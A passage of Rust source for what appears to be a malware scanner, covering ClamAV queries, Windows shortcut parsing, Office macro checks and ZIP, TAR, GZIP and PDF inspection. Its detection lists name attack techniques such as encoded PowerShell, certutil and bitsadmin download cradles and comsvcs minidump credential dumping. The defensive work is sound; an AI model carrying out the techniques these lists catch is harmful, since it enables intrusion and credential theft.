    sock.write_all(&0u32.to_be_bytes())?;
    sock.flush()?;

    let mut resp_buf = [0u8; 1024];
    let n = sock.read(&mut resp_buf)?;
    let resp = String::from_utf8_lossy(&resp_buf[..n])
        .trim_matches(|c: char| c == '\0' || c.is_whitespace())
        .to_string();
    if let Some(without_found) = resp.strip_suffix("FOUND") {
        let sig = without_found
            .trim()
            .strip_prefix("stream:")
            .unwrap_or(without_found)
            .trim()
            .to_string();
        if !sig.is_empty() {
            return Ok(Some(sig));
        }
    }
    Ok(None)
}

/// Optionally forward in-memory file bytes to a local ClamAV `clamd` daemon via `zINSTREAM\0`.
/// Gracefully backs off for 60s if no local `clamd` socket is listening.
pub(crate) fn query_clamd_instream(buffer: &[u8]) -> Option<String> {
    if buffer.is_empty() {
        return None;
    }
    let now = unix_epoch_secs();
    let last_fail = LAST_CLAMD_FAIL_EPOCH_SECS.load(Ordering::Relaxed);
    if last_fail > 0 && now.saturating_sub(last_fail) < CLAMD_COOLDOWN_SECS {
        return None;
    }

    let timeout = Some(std::time::Duration::from_millis(350));

    #[cfg(unix)]
    {
        use std::os::unix::net::UnixStream;
        for sock_path in &[
            "/run/clamav/clamd.ctl",
            "/var/run/clamav/clamd.ctl",
            "/var/run/clamd.scan/clamd.sock",
            "/tmp/clamd.socket",
        ] {
            if let Ok(stream) = UnixStream::connect(sock_path) {
                let _ = stream.set_read_timeout(timeout);
                let _ = stream.set_write_timeout(timeout);
                if let Ok(verdict) = stream_to_clamd(stream, buffer) {
                    return verdict;
                }
            }
        }
    }

    let tcp_addr: std::net::SocketAddr = ([127, 0, 0, 1], 3310).into();
    if let Ok(stream) =
        std::net::TcpStream::connect_timeout(&tcp_addr, std::time::Duration::from_millis(150))
    {
        let _ = stream.set_read_timeout(timeout);
        let _ = stream.set_write_timeout(timeout);
        if let Ok(verdict) = stream_to_clamd(stream, buffer) {
            return verdict;
        }
    }

    LAST_CLAMD_FAIL_EPOCH_SECS.store(now, Ordering::Relaxed);
    None
}

fn is_zip_slip_path(entry_name: &str) -> bool {
    let norm = entry_name.replace('\\', "/");
    if norm.starts_with('/')
        || norm == ".."
        || norm.starts_with("../")
        || norm.contains("/../")
        || norm.ends_with("/..")
    {
        return true;
    }
    let b = entry_name.as_bytes();
    b.len() >= 2 && b[0].is_ascii_alphabetic() && b[1] == b':'
}

fn is_executable_or_script_name(name: &str) -> bool {
    let ext = Path::new(name)
        .extension()
        .and_then(|e| e.to_str())
        .map(|s| s.to_ascii_lowercase())
        .unwrap_or_default();
    matches!(
        ext.as_str(),
        "exe" | "dll" | "scr" | "bat" | "cmd" | "ps1" | "psm1" | "vbs" | "vbe" | "js" | "jse"
            | "hta" | "wsf" | "sh" | "bash" | "elf" | "bin" | "py" | "pl" | "com" | "pif"
            | "msi" | "jar" | "iso" | "lnk"
    )
}

fn le_u16(b: &[u8], off: usize) -> Option<u16> {
    b.get(off..off + 2).map(|s| u16::from_le_bytes([s[0], s[1]]))
}

fn le_u32(b: &[u8], off: usize) -> Option<u32> {
    b.get(off..off + 4)
        .map(|s| u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

fn read_bounded<R: Read>(mut reader: R, limit: usize) -> Option<(Vec<u8>, bool)> {
    let mut out = Vec::new();
    let mut chunk = [0u8; 16 * 1024];
    loop {
        match reader.read(&mut chunk) {
            Ok(0) => return Some((out, false)),
            Ok(n) => {
                if out.len() + n > limit {
                    out.extend_from_slice(&chunk[..limit - out.len()]);
                    return Some((out, true));
                }
                out.extend_from_slice(&chunk[..n]);
            }
            Err(_) => {
                if out.is_empty() {
                    return None;
                }
                return Some((out, false));
            }
        }
    }
}

/// Extract contiguous printable ASCII strings encoded as UTF-16LE (common in PowerShell & Office macros).
fn extract_utf16le_ascii(raw: &[u8]) -> Option<String> {
    if raw.len() < 16 {
        return None;
    }
    let mut collected = Vec::new();
    let mut run = Vec::new();
    let mut i = 0usize;
    while i + 1 < raw.len() {
        let lo = raw[i];
        let hi = raw[i + 1];
        if hi == 0 && (lo.is_ascii_graphic() || lo == b' ' || lo == b'\t' || lo == b'\n' || lo == b'\r')
        {
            run.push(lo);
            i += 2;
        } else {
            if run.len() >= 12 {
                collected.extend_from_slice(&run);
                collected.push(b'\n');
            }
            run.clear();
            i += 1;
        }
    }
    if run.len() >= 12 {
        collected.extend_from_slice(&run);
    }
    if collected.len() >= 16 {
        Some(String::from_utf8_lossy(&collected).to_string())
    } else {
        None
    }
}

struct ParsedLnk {
    target_path: String,
    arguments: String,
    icon_location: String,
}

fn read_c_str(slice: &[u8]) -> String {
    let end = slice.iter().position(|&b| b == 0).unwrap_or(slice.len());
    String::from_utf8_lossy(&slice[..end]).to_string()
}

fn read_lnk_string(buffer: &[u8], pos: &mut usize, is_unicode: bool) -> Option<String> {
    let count = le_u16(buffer, *pos)? as usize;
    *pos = pos.checked_add(2)?;
    if count == 0 {
        return Some(String::new());
    }
    if is_unicode {
        let byte_len = count.checked_mul(2)?;
        let end = pos.checked_add(byte_len)?;
        if end > buffer.len() {
            return None;
        }
        let code_units: Vec<u16> = buffer[*pos..end]
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        *pos = end;
        Some(String::from_utf16_lossy(&code_units))
    } else {
        let end = pos.checked_add(count)?;
        if end > buffer.len() {
            return None;
        }
        let s = String::from_utf8_lossy(&buffer[*pos..end]).to_string();
        *pos = end;
        Some(s)
    }
}

/// Structured MS-SHLLINK binary parser extracting target path, CLI arguments, and icon location.
fn parse_lnk_binary(buffer: &[u8]) -> Option<ParsedLnk> {
    const LNK_CLSID: [u8; 16] = [
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
    ];
    if buffer.len() < 76 || le_u32(buffer, 0) != Some(0x0000_004C) || buffer[4..20] != LNK_CLSID {
        return None;
    }

    let link_flags = le_u32(buffer, 20)?;
    let is_unicode = (link_flags & 0x0080) != 0;
    let mut pos = 76usize;

    if (link_flags & 0x0001) != 0 {
        let id_list_size = le_u16(buffer, pos)? as usize;
        pos = pos.checked_add(2)?.checked_add(id_list_size)?;
        if pos > buffer.len() {
            return None;
        }
    }

    let mut target_path = String::new();
    if (link_flags & 0x0002) != 0 {
        let info_size = le_u32(buffer, pos)? as usize;
        if info_size < 16 || pos.checked_add(info_size)? > buffer.len() {
            return None;
        }
        let info_slice = &buffer[pos..pos + info_size];
        let info_flags = le_u32(info_slice, 8).unwrap_or(0);
        let common_suffix = if info_size >= 28 {
            let cps_off = le_u32(info_slice, 24).unwrap_or(0) as usize;
            if cps_off >= 16 && cps_off < info_size {
                read_c_str(&info_slice[cps_off..])
            } else {
                String::new()
            }
        } else {
            String::new()
        };

        if (info_flags & 0x01) != 0 && info_size >= 28 {
            let lbp_off = le_u32(info_slice, 16).unwrap_or(0) as usize;
            if lbp_off >= 16 && lbp_off < info_size {
                target_path.push_str(&read_c_str(&info_slice[lbp_off..]));
            }
            if !common_suffix.is_empty() {
                if !target_path.is_empty()
                    && !target_path.ends_with('\\')
                    && !common_suffix.starts_with('\\')
                {
                    target_path.push('\\');
                }
                target_path.push_str(&common_suffix);
            }
        }
        if (info_flags & 0x02) != 0 && info_size >= 24 {
            let net_off = le_u32(info_slice, 20).unwrap_or(0) as usize;
            if net_off >= 16 && net_off + 20 <= info_size {
                let net_name_off = le_u32(info_slice, net_off + 8).unwrap_or(0) as usize;
                let abs_net = net_off.saturating_add(net_name_off);
                if abs_net < info_size {
                    let net_name = read_c_str(&info_slice[abs_net..]);
                    if !net_name.is_empty() {
                        if !target_path.is_empty() {
                            target_path.push(' ');
                        }
                        target_path.push_str(&net_name);
                        if !common_suffix.is_empty() {
                            if !net_name.ends_with('\\') && !common_suffix.starts_with('\\') {
                                target_path.push('\\');
                            }
                            target_path.push_str(&common_suffix);
                        }
                    }
                }
            }
        }
        pos += info_size;
    }

    if (link_flags & 0x0004) != 0 {
        let _name = read_lnk_string(buffer, &mut pos, is_unicode)?;
    }
    if (link_flags & 0x0008) != 0 {
        if let Some(rel_path) = read_lnk_string(buffer, &mut pos, is_unicode) {
            if !rel_path.is_empty() {
                if !target_path.is_empty() {
                    target_path.push(' ');
                }
                target_path.push_str(&rel_path);
            }
        }
    }
    if (link_flags & 0x0010) != 0 {
        let _working_dir = read_lnk_string(buffer, &mut pos, is_unicode)?;
    }
    let arguments = if (link_flags & 0x0020) != 0 {
        read_lnk_string(buffer, &mut pos, is_unicode).unwrap_or_default()
    } else {
        String::new()
    };
    let icon_location = if (link_flags & 0x0040) != 0 {
        read_lnk_string(buffer, &mut pos, is_unicode).unwrap_or_default()
    } else {
        String::new()
    };

    Some(ParsedLnk {
        target_path,
        arguments,
        icon_location,
    })
}

/// True when `lower_text` (a command line, or `target + args`) actually invokes a PowerShell host binary
/// (`powershell`, `powershell.exe`, `pwsh`, `pwsh.exe`, `powershell_ise.exe` as a path basename token).
pub fn invokes_powershell_host(lower_text: &str) -> bool {
    lower_text
        .split(|c: char| c.is_ascii_whitespace() || c == '"' || c == '\'' || c == ';' || c == ',')
        .any(|tok| {
            let base = tok.rsplit(['\\', '/']).next().unwrap_or(tok);
            matches!(
                base,
                "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe" | "powershell_ise.exe"
            )
        })
}

/// Detect PowerShell `-EncodedCommand` / `-ec` and prefix-shortened variants
/// (`-e`, `-en`, `-enc`, `-enco`, …, `-encodedcommand`, `-enc:payload`) without matching `-Encoding`.
///
/// Callers MUST first confirm a PowerShell host is being invoked (see [`invokes_powershell_host`]), because
/// `-e` is a common switch for unrelated tools. The `/` switch form is only honoured for `/ec` and `/enc…`
/// (length ≥ 3) so that `cmd /E:ON` or `xcopy /E` are never treated as encoded commands.
pub fn has_encoded_powershell_flag(lower_args: &str) -> bool {
    lower_args
        .split(|c: char| c.is_ascii_whitespace() || c == '"' || c == '\'' || c == ';')
        .any(|tok| {
            let (rest, dash) = if let Some(r) = tok.strip_prefix('-') {
                (r, true)
            } else if let Some(r) = tok.strip_prefix('/') {
                (r, false)
            } else {
                return false;
            };
            let flag = rest.split([':', '=']).next().unwrap_or("");
            if flag.is_empty() {
                return false;
            }
            let is_prefix = flag == "ec" || "encodedcommand".starts_with(flag);
            is_prefix && (dash || flag == "ec" || flag.len() >= 3)
        })
}

/// Convenience: PowerShell host is invoked AND an encoded-command flag is present.
pub fn is_powershell_encoded_invocation(lower_text: &str) -> bool {
    invokes_powershell_host(lower_text) && has_encoded_powershell_flag(lower_text)
}

/// Inspect structured MS-SHLLINK (`.lnk`) target path, CLI arguments, and icon masquerading fields
/// to detect LOLBin cradles, obfuscated script execution, or remote UNC droppers without broad string grepping.
pub fn inspect_lnk_shortcut(
    virtual_path: &str,
    buffer: &[u8],
    sha256_hex: &str,
    entropy: f64,
) -> Option<ThreatDetection> {
    let parsed = parse_lnk_binary(buffer)?;
    let target = parsed.target_path.to_ascii_lowercase();
    let args = parsed.arguments.to_ascii_lowercase();
    let icon = parsed.icon_location.to_ascii_lowercase();

    let is_shell_or_lolbin = [
        "powershell",
        "pwsh",
        "cmd.exe",
        "mshta",
        "rundll32",
        "regsvr32",
        "wscript",
        "cscript",
        "certutil",
        "bitsadmin",
    ]
    .iter()
    .any(|bin| target.contains(bin) || args.contains(bin));

    let has_direct_weaponized_args =
        is_powershell_encoded_invocation(&format!("{} {}", target, args))
        || [
            "-w hidden",
            "-windowstyle hidden",
            "frombase64string",
            "downloadstring",
            "downloadfile",
            "invoke-expression",
            "iex(",
            "iex ",
            "javascript:",
            "vbscript:",
            "-urlcache",
            "/transfer",
            "comsvcs",
            "minidump",
        ]
        .iter()
        .any(|tok| args.contains(tok));

    let has_url_or_unc_arg = ["http://", "https://", "\\\\"]
        .iter()
        .any(|tok| args.contains(tok));
    let has_download_or_script_cradle = [
        "mshta",
        "certutil",
        "bitsadmin",
        "regsvr32",
        "rundll32",
        "wscript",
        "cscript",
        "curl",
        "wget",
        "invoke-webrequest",
        "iwr ",
        "irm ",
        "invoke-restmethod",
        "webclient",
        "xmlhttp",
        "start-bitstransfer",
    ]
    .iter()
    .any(|tok| target.contains(tok) || args.contains(tok));

    let has_weaponized_args =
        has_direct_weaponized_args || (has_url_or_unc_arg && has_download_or_script_cradle);

    let has_doc_icon_masquerade = [".pdf", ".doc", ".xls", "acrord", "wordicon", "pdficon"]
        .iter()
        .any(|tok| icon.contains(tok));

    let remote_unc_exec = target.starts_with("\\\\")
        && [".exe", ".dll", ".scr", ".bat", ".vbs", ".ps1", ".hta"]
            .iter()
            .any(|ext| target.contains(ext));

    if (is_shell_or_lolbin && (has_weaponized_args || has_doc_icon_masquerade)) || remote_unc_exec {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "Heur.LNK.MaliciousShortcutDropper",
            "Trojan.Shortcut",
            "High",
            "LNK Shortcut Structure Inspector",
            "Windows Shortcut (.lnk) target/arguments execute a weaponized LOLBin cradle, document-icon masquerade, or remote UNC payload.".to_string(),
        ));
    }

    None
}

/// Evaluate Mark-of-the-Web (Internet `ZoneId=3/4`) script droppers and high-entropy executables.
pub fn evaluate_motw_payload_risk(
    full_path: &str,
    file_name: &str,
    buffer: &[u8],
    sha256_hex: &str,
    entropy: f64,
) -> Option<ThreatDetection> {
    let ext = Path::new(file_name)
        .extension()
        .map(|e| e.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();

    let is_script_or_dropper = matches!(
        ext.as_str(),
        "hta" | "vbs" | "vbe" | "js" | "jse" | "wsf" | "ps1" | "bat" | "cmd"
    );
    if is_script_or_dropper {
        let mut combined = String::from_utf8_lossy(buffer).to_ascii_lowercase();
        if let Some(u16_text) = extract_utf16le_ascii(buffer) {
            combined.push('\n');
            combined.push_str(&u16_text.to_ascii_lowercase());
        }
        let has_dropper_primitive = is_powershell_encoded_invocation(&combined)
            || [
            "wscript.shell",
            "scripting.filesystemobject",
            "adodb.stream",
            "xmlhttp",
            "urldownloadtofile",
            "invoke-webrequest",
            "downloadstring",
            "frombase64string",
            "-encodedcommand",
            "rundll32",
            "regsvr32",
            "mshta",
            "certutil",
            "bitsadmin",
        ]
        .iter()
        .any(|tok| combined.contains(tok));
        if has_dropper_primitive {
            return Some(detection(
                full_path,
                sha256_hex,
                entropy,
                "Heur.MotW.InternetScriptDropper",
                "Trojan.Downloader",
                "High",
                "Mark-of-the-Web (Zone.Identifier) Guard",
                "Internet-downloaded script/dropper (ZoneId=3/4) contains shell, COM, or network execution primitives.".to_string(),
            ));
        }
    }

    None
}

/// Check NTFS Mark-of-the-Web (`:Zone.Identifier` Alternate Data Stream) for Internet (`ZoneId=3`)
/// or Restricted Sites (`ZoneId=4`) download origin.
pub fn has_internet_motw(_path: &Path) -> bool {
    #[cfg(target_os = "windows")]
    {
        let ads_path = format!("{}:Zone.Identifier", _path.display());
        if let Ok(mut file) = File::open(ads_path) {
            let mut buf = [0u8; 4096];
            if let Ok(n) = file.read(&mut buf) {
                let text = String::from_utf8_lossy(&buf[..n]).to_ascii_lowercase();
                return text.contains("zoneid=3") || text.contains("zoneid=4");
            }
        }
    }
    false
}

/// Inspect OLE2 / `vbaProject.bin` payloads for weaponized Office VBA macro execution patterns.
fn detect_office_macro_threat(
    virtual_path: &str,
    sha256_hex: &str,
    entropy: f64,
    payload: &[u8],
) -> Option<ThreatDetection> {
    let mut searchable = String::from_utf8_lossy(payload).to_lowercase();
    if let Some(u16_text) = extract_utf16le_ascii(payload) {
        searchable.push('\n');
        searchable.push_str(&u16_text.to_lowercase());
    }
    let has_trigger = ["autoopen", "auto_open", "autoexec", "document_open", "workbook_open"]
        .iter()
        .any(|k| searchable.contains(k));
    let has_exec = [
        "wscript.shell",
        "createobject",
        "powershell",
        "cmd.exe",
        "urldownloadtofile",
        "msxml2.xmlhttp",
        "shell(",
        "/c ",
    ]
    .iter()
    .any(|k| searchable.contains(k));
    if has_trigger && has_exec {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "Heur.Office.MaliciousVBAMacro",
            "Trojan.OfficeMacro",
            "Critical",
            "Deep Office Macro Inspector",
            "Weaponized Office VBA macro combining auto-execution trigger with shell/network dropper payload.".to_string(),
        ));
    }
    None
}

struct ZipMemberMeta<'a> {
    name: String,
    flags: u16,
    method: u16,
    comp_data: &'a [u8],
    uncomp_size: u32,
}

fn collect_zip_members(buffer: &[u8]) -> Vec<ZipMemberMeta<'_>> {
    let mut entries = Vec::new();

    // Prefer Central Directory when EOCD + CD fit inside our inspected buffer (handles data descriptors).
    let search_start = buffer.len().saturating_sub(65_558);
    if let Some(rel_eocd) = buffer[search_start..]
        .windows(4)
        .rposition(|w| w == b"PK\x05\x06")
    {
        let eocd_off = search_start + rel_eocd;
        if let (Some(cd_size), Some(cd_off)) = (le_u32(buffer, eocd_off + 12), le_u32(buffer, eocd_off + 16)) {
            let cd_off = cd_off as usize;
            let cd_end = cd_off.saturating_add(cd_size as usize);
            if cd_end <= buffer.len() {
                let mut cur = cd_off;
                while cur + 46 <= cd_end && entries.len() < MAX_ARCHIVE_ENTRIES {
                    if &buffer[cur..cur + 4] != b"PK\x01\x02" {
                        break;
                    }
                    let flags = le_u16(buffer, cur + 8).unwrap_or(0);
                    let method = le_u16(buffer, cur + 10).unwrap_or(0);
                    let comp_size = le_u32(buffer, cur + 20).unwrap_or(0);
                    let uncomp_size = le_u32(buffer, cur + 24).unwrap_or(0);
                    let fname_len = le_u16(buffer, cur + 28).unwrap_or(0) as usize;
                    let extra_len = le_u16(buffer, cur + 30).unwrap_or(0) as usize;
                    let comment_len = le_u16(buffer, cur + 32).unwrap_or(0) as usize;
                    let local_off = le_u32(buffer, cur + 42).unwrap_or(0) as usize;
                    let name_end = cur + 46 + fname_len;
                    if name_end > cd_end {
                        break;
                    }
                    let name = String::from_utf8_lossy(&buffer[cur + 46..name_end]).to_string();
                    let next_cd = name_end + extra_len + comment_len;
                    cur = next_cd;

                    let comp_data = if local_off + 30 <= buffer.len()
                        && &buffer[local_off..local_off + 4] == b"PK\x03\x04"
                    {
                        let l_fn = le_u16(buffer, local_off + 26).unwrap_or(0) as usize;
                        let l_ex = le_u16(buffer, local_off + 28).unwrap_or(0) as usize;
                        let data_start = local_off + 30 + l_fn + l_ex;
                        let data_end = data_start.saturating_add(comp_size as usize);
                        if data_end <= buffer.len() && data_start <= data_end {
                            &buffer[data_start..data_end]
                        } else {
                            &[][..]
                        }
                    } else {
                        &[][..]
                    };

                    entries.push(ZipMemberMeta {
                        name,
                        flags,
                        method,
                        comp_data,
                        uncomp_size,
                    });
                }
                if !entries.is_empty() {
                    return entries;
                }
            }
        }
    }

    // Fallback: sequential local file header scan.
    let mut off = 0usize;
    while off + 30 <= buffer.len() && entries.len() < MAX_ARCHIVE_ENTRIES {
        if &buffer[off..off + 4] != b"PK\x03\x04" {
            break;
        }
        let flags = le_u16(buffer, off + 6).unwrap_or(0);
        let method = le_u16(buffer, off + 8).unwrap_or(0);
        let comp_size = le_u32(buffer, off + 18).unwrap_or(0) as usize;
        let uncomp_size = le_u32(buffer, off + 22).unwrap_or(0);
        let fname_len = le_u16(buffer, off + 26).unwrap_or(0) as usize;
        let extra_len = le_u16(buffer, off + 28).unwrap_or(0) as usize;
        let name_start = off + 30;
        let data_start = name_start.saturating_add(fname_len).saturating_add(extra_len);
        if data_start > buffer.len() {
            break;
        }
        let name = String::from_utf8_lossy(&buffer[name_start..name_start + fname_len]).to_string();
        let data_end = data_start.saturating_add(comp_size).min(buffer.len());
        let comp_data = if comp_size > 0 && data_end > data_start {
            &buffer[data_start..data_end]
        } else {
            &[][..]
        };
        entries.push(ZipMemberMeta {
            name,
            flags,
            method,
            comp_data,
            uncomp_size,
        });
        if comp_size == 0 && (flags & 0x0008) != 0 {
            break;
        }
        off = data_start.saturating_add(comp_size);
    }
    entries
}

fn inspect_zip_buffer(
    virtual_path: &str,
    buffer: &[u8],
    outer_sha: &str,
    outer_entropy: f64,
    depth: u8,
) -> Option<ThreatDetection> {
    for member in collect_zip_members(buffer) {
        if member.name.is_empty() {
            continue;
        }
        let member_vpath = format!("{}::{}", virtual_path, member.name);
        if is_zip_slip_path(&member.name) {
            return Some(detection(
                &member_vpath,
                outer_sha,
                outer_entropy,
                "Heur.Archive.ZipSlipTraversal",
                "Exploit.PathTraversal",
                "Critical",
                "Deep Archive Unpacker (ZIP)",
                format!(
                    "Archive member '{}' attempts directory traversal (ZipSlip) outside extraction target.",
                    member.name
                ),
            ));
        }

        let is_encrypted = (member.flags & 0x0001) != 0;
        if is_encrypted && is_executable_or_script_name(&member.name) {
            return Some(detection(
                &member_vpath,
                outer_sha,
                outer_entropy,
                "Heur.Archive.EncryptedExecutableDropper",
                "Suspicious.Archive",
                "High",
                "Deep Archive Unpacker (ZIP)",
                format!(
                    "Password-encrypted executable or script dropper '{}' inside archive evades static inspection.",
                    member.name
                ),
            ));
        }

        let comp_len = member.comp_data.len();
        if member.uncomp_size as usize > MAX_MEMBER_UNPACK_BYTES
            || (comp_len > 0
                && member.uncomp_size as usize > 512 * 1024
                && (member.uncomp_size as usize) / comp_len > MAX_COMPRESSION_RATIO)
        {
            return Some(detection(
                &member_vpath,
                outer_sha,
                outer_entropy,
                "Heur.Archive.ZipBomb",
                "Exploit.DoS",
                "High",
                "Deep Archive Unpacker (ZIP)",
                format!(
                    "Archive member '{}' declares excessive uncompressed ratio/size ({} bytes).",
                    member.name, member.uncomp_size
                ),
            ));
        }

        if is_encrypted || member.comp_data.is_empty() || member.name.ends_with('/') {
            continue;
        }

        let decompressed = match member.method {
            0 => {
                if member.comp_data.len() > MAX_MEMBER_UNPACK_BYTES {
                    return Some(detection(
                        &member_vpath,
                        outer_sha,
                        outer_entropy,
                        "Heur.Archive.ZipBomb",
                        "Exploit.DoS",
                        "High",
                        "Deep Archive Unpacker (ZIP)",
                        "Stored archive member exceeds 8 MB safety ceiling.".to_string(),
                    ));
                }
                member.comp_data.to_vec()
            }
            8 => match read_bounded(DeflateDecoder::new(member.comp_data), MAX_MEMBER_UNPACK_BYTES) {
                Some((_, true)) => {
                    return Some(detection(
                        &member_vpath,
                        outer_sha,
                        outer_entropy,
                        "Heur.Archive.ZipBomb",
                        "Exploit.DoS",
                        "High",
                        "Deep Archive Unpacker (ZIP)",
                        format!(
                            "Deflate stream for '{}' expanded beyond {} byte safety ceiling.",
                            member.name, MAX_MEMBER_UNPACK_BYTES
                        ),
                    ));
                }
                Some((bytes, false)) => {
                    if bytes.len() > 512 * 1024 && comp_len > 0 && bytes.len() / comp_len > MAX_COMPRESSION_RATIO
                    {
                        return Some(detection(
                            &member_vpath,
                            outer_sha,
                            outer_entropy,
                            "Heur.Archive.ZipBomb",
                            "Exploit.DoS",
                            "High",
                            "Deep Archive Unpacker (ZIP)",
                            format!(
                                "High-ratio ZipBomb expansion ({}:1) in '{}'.",
                                bytes.len() / comp_len,
                                member.name
                            ),
                        ));
                    }
                    bytes
                }
                None => continue,
            },
            _ => continue,
        };

        if decompressed.is_empty() {
            continue;
        }

        let member_sha = hex::encode(Sha256::digest(&decompressed));
        let lower_member = member.name.to_ascii_lowercase();
        if lower_member.ends_with("vbaproject.bin") {
            if let Some(det) = detect_office_macro_threat(
                &member_vpath,
                &member_sha,
                calculate_entropy(&decompressed),
                &decompressed,
            ) {
                return Some(det);
            }
        }

        let base_name = member
            .name
            .rsplit(|c| c == '/' || c == '\\')
            .next()
            .unwrap_or(&member.name)
            .to_string();
        if let Some(det) = scan_buffer_layers(
            &member_vpath,
            &base_name,
            &decompressed,
            &member_sha,
            depth + 1,
            false,
        ) {
            return Some(det);
        }
    }
    None
}

fn inspect_gzip_buffer(
    virtual_path: &str,
    file_name: &str,
    buffer: &[u8],
    outer_sha: &str,
    outer_entropy: f64,
    depth: u8,
) -> Option<ThreatDetection> {
    let gz_vpath = format!("{}::gunzip", virtual_path);
    match read_bounded(GzDecoder::new(buffer), MAX_MEMBER_UNPACK_BYTES) {
        Some((_, true)) => Some(detection(
            &gz_vpath,
            outer_sha,
            outer_entropy,
            "Heur.Archive.ZipBomb",
            "Exploit.DoS",
            "High",
            "Deep Archive Unpacker (GZIP)",
            "GZIP stream exceeds 8 MB safety unpacking ceiling (potential decompression bomb).".to_string(),
        )),
        Some((decompressed, false)) => {
            if decompressed.len() > 512 * 1024
                && !buffer.is_empty()
                && decompressed.len() / buffer.len() > MAX_COMPRESSION_RATIO
            {
                return Some(detection(
                    &gz_vpath,
                    outer_sha,
                    outer_entropy,
                    "Heur.Archive.ZipBomb",
                    "Exploit.DoS",
                    "High",
                    "Deep Archive Unpacker (GZIP)",
                    "GZIP stream exceeded 100:1 expansion ratio.".to_string(),
                ));
            }
            if decompressed.is_empty() {
                return None;
            }
            let inner_name = if file_name.to_ascii_lowercase().ends_with(".tgz") {
                format!("{}.tar", &file_name[..file_name.len() - 4])
            } else if file_name.to_ascii_lowercase().ends_with(".gz") {
                file_name[..file_name.len() - 3].to_string()
            } else {
                "gunzip_payload.bin".to_string()
            };
            let inner_sha = hex::encode(Sha256::digest(&decompressed));
            scan_buffer_layers(&gz_vpath, &inner_name, &decompressed, &inner_sha, depth + 1, false)
        }
        None => None,
    }
}

fn inspect_tar_buffer(
    virtual_path: &str,
    buffer: &[u8],
    outer_sha: &str,
    outer_entropy: f64,
    depth: u8,
) -> Option<ThreatDetection> {
    let mut off = 0usize;
    let mut count = 0usize;
    while off + 512 <= buffer.len() && count < MAX_ARCHIVE_ENTRIES {
        let hdr = &buffer[off..off + 512];
        if hdr.iter().all(|&b| b == 0) {
            break;
        }
        count += 1;
        let name_part = String::from_utf8_lossy(&hdr[0..100])
            .trim_end_matches('\0')
            .to_string();
        let prefix_part = if &hdr[257..262] == b"ustar" {
            String::from_utf8_lossy(&hdr[345..500])
                .trim_end_matches('\0')
                .to_string()
        } else {
            String::new()
        };
        let member_name = if prefix_part.is_empty() {
            name_part
        } else {
            format!("{}/{}", prefix_part, name_part)
        };
        let size_str = String::from_utf8_lossy(&hdr[124..136])
            .trim_matches(|c: char| c == '\0' || c.is_whitespace())
            .to_string();
        let size = usize::from_str_radix(&size_str, 8).unwrap_or(0);
        let typeflag = hdr[156];

        if !member_name.is_empty() && is_zip_slip_path(&member_name) {
            return Some(detection(
                &format!("{}::{}", virtual_path, member_name),
                outer_sha,
                outer_entropy,
                "Heur.Archive.ZipSlipTraversal",
                "Exploit.PathTraversal",
                "Critical",
                "Deep Archive Unpacker (TAR)",
                format!(
                    "TAR member '{}' attempts path traversal outside extraction directory.",
                    member_name
                ),
            ));
        }

        let data_start = off + 512;
        let data_end = data_start.saturating_add(size).min(buffer.len());
        let is_regular = matches!(typeflag, b'0' | b'\0' | b'7');
        if is_regular && size > 0 && size <= MAX_MEMBER_UNPACK_BYTES && data_start < data_end {
            let payload = &buffer[data_start..data_end];
            let member_vpath = format!("{}::{}", virtual_path, member_name);
            let member_sha = hex::encode(Sha256::digest(payload));
            let base_name = member_name
                .rsplit('/')
                .next()
                .unwrap_or(&member_name)
                .to_string();
            if let Some(det) = scan_buffer_layers(
                &member_vpath,
                &base_name,
                payload,
                &member_sha,
                depth + 1,
                false,
            ) {
                return Some(det);
            }
        }

        let blocks = size.div_ceil(512);
        let step = 512usize.saturating_add(blocks.saturating_mul(512));
        off = match off.checked_add(step) {
            Some(next) if next > off => next,
            _ => break,
        };
    }
    None
}

fn inspect_pdf_buffer(
    virtual_path: &str,
    buffer: &[u8],
    outer_sha: &str,
    outer_entropy: f64,
    depth: u8,
) -> Option<ThreatDetection> {
    let mut combined_lower = String::from_utf8_lossy(buffer).to_lowercase();
    let mut pos = 0usize;
    let mut stream_idx = 0usize;
    let mut total_decoded = 0usize;

    while pos + 6 < buffer.len()
        && stream_idx < MAX_ARCHIVE_ENTRIES
        && total_decoded < MAX_MEMBER_UNPACK_BYTES
    {
        let Some(rel) = buffer[pos..].windows(6).position(|w| w == b"stream") else {
            break;
        };
        let s_off = pos + rel;
        let after = s_off + 6;
        let prev_ok = s_off == 0 || matches!(buffer[s_off - 1], b' ' | b'\n' | b'\r' | b'\t' | b'>');
        let line_break_len = if buffer.get(after..after + 2) == Some(b"\r\n") {
            2
        } else if matches!(buffer.get(after), Some(b'\n' | b'\r')) {
            1
        } else {
            pos = after;
            continue;
        };
        if !prev_ok {
            pos = after;
            continue;
        }
        let body_start = after + line_break_len;
        let Some(rel_end) = buffer[body_start..].windows(9).position(|w| w == b"endstream") else {
            break;
        };
        let mut body_end = body_start + rel_end;
        if body_end >= 2 && &buffer[body_end - 2..body_end] == b"\r\n" {
            body_end -= 2;
        } else if body_end >= 1 && matches!(buffer[body_end - 1], b'\n' | b'\r') {
            body_end -= 1;
        }

        let raw_stream = &buffer[body_start..body_end];
        stream_idx += 1;
        pos = body_start + rel_end + 9;

        let decoded_opt = if raw_stream.len() >= 2 && raw_stream[0] == 0x78 {
            read_bounded(ZlibDecoder::new(raw_stream), 2 * 1024 * 1024).map(|(b, _)| b)
        } else {
            None
        }
        .or_else(|| {
            read_bounded(DeflateDecoder::new(raw_stream), 2 * 1024 * 1024)
                .map(|(b, _)| b)
                .filter(|b| !b.is_empty())
        });

        if let Some(decoded) = decoded_opt {
            if !decoded.is_empty() {
                total_decoded += decoded.len();
                combined_lower.push('\n');
                combined_lower.push_str(&String::from_utf8_lossy(&decoded).to_lowercase());
                let stream_vpath = format!("{}::pdf_stream_{}", virtual_path, stream_idx);
                let stream_sha = hex::encode(Sha256::digest(&decoded));
                if let Some(det) = scan_buffer_layers(
                    &stream_vpath,
                    "pdf_stream.bin",
                    &decoded,
                    &stream_sha,
                    depth + 1,
                    false,
                ) {
                    return Some(det);
                }
            }
        }
    }

